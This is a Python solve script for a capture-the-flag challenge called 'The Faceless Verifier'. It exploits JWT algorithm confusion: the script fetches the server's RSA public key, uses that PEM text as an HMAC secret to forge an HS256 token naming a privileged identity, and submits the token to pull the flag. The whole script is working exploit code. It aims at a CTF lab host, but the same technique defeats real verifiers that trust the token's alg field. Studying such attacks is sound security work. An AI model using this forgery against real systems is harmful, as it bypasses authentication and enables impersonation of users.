#!/usr/bin/env python3
"""
The Faceless Verifier - JWT Algorithm Confusion Attack
Based on the complete solution provided

Key insights:
1. Server generates NEW RSA key pair for each connection
2. Must get pubkey and submit token in SAME connection
3. Use HS256 with public key PEM (with trailing newline) as HMAC secret
4. Name must be "many-faced" (not "Jaqen H'ghar")
5. The trailing newline in the PEM key is crucial
"""

import socket
import json
import base64
import hmac
import hashlib
import time

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

HOST = "labs.cyberspacevr.in"
PORT = 30343

print("="*70)
print("THE FACELESS VERIFIER - JWT ALGORITHM CONFUSION ATTACK")
print("="*70)

# Single connection for everything (key rotates per connection)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(15)
s.connect((HOST, PORT))

# Skip banner
banner = s.recv(4096).decode()
print("[+] Connected, got banner")

# Step 1: Get public key
print("\n[Step 1] Getting RSA public key...")
s.sendall(b'pubkey\n')
time.sleep(1)
resp = s.recv(4096).decode()

# Extract PEM key exactly as returned
lines = resp.split('\n')
key_lines = []
in_key = False

for line in lines:
    if '-----BEGIN' in line:
        in_key = True
    if in_key:
        key_lines.append(line)
    if '-----END' in line:
        break

exact_key = '\n'.join(key_lines)
print(f"[+] Got public key ({len(exact_key)} chars)")

# Step 2: Forge HS256 token
print("\n[Step 2] Forging HS256 token...")

# CRITICAL: Use PEM string with trailing newline as HMAC secret
key_with_newline = (exact_key + '\n').encode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"name": "many-faced", "iat": int(time.time())}

# Encode header and payload
h = base64url_encode(json.dumps(header, separators=(',', ':')))
p = base64url_encode(json.dumps(payload, separators=(',', ':')))

# Create signing input
signing_input = f"{h}.{p}".encode()

# Sign with HMAC-SHA256 using public key as secret
sig = hmac.new(key_with_newline, signing_input, hashlib.sha256).digest()
sig_b64 = base64url_encode(sig)

# Construct final token
token = f"{signing_input.decode()}.{sig_b64}"

print(f"[+] Forged token: {token[:80]}...")
print(f"[+] Header: {header}")
print(f"[+] Payload: {payload}")
print(f"[+] HMAC secret length: {len(key_with_newline)} bytes")

# Step 3: Submit token (same connection!)
print("\n[Step 3] Submitting forged token...")
s.sendall(f'submit {token}\n'.encode())
time.sleep(1)
response = s.recv(4096).decode()

print("\n" + "="*70)
print("SERVER RESPONSE:")
print("="*70)
print(response)

# Look for flag
if 'SpaceCTF{' in response:
    start = response.index('SpaceCTF{')
    end = response.index('}', start) + 1
    flag = response[start:end]
    print("\n" + "="*70)
    print("🎉 FLAG FOUND!")
    print("="*70)
    print(f"FLAG: {flag}")
    print("="*70)
else:
    print("\n[!] No flag found in response")

s.close()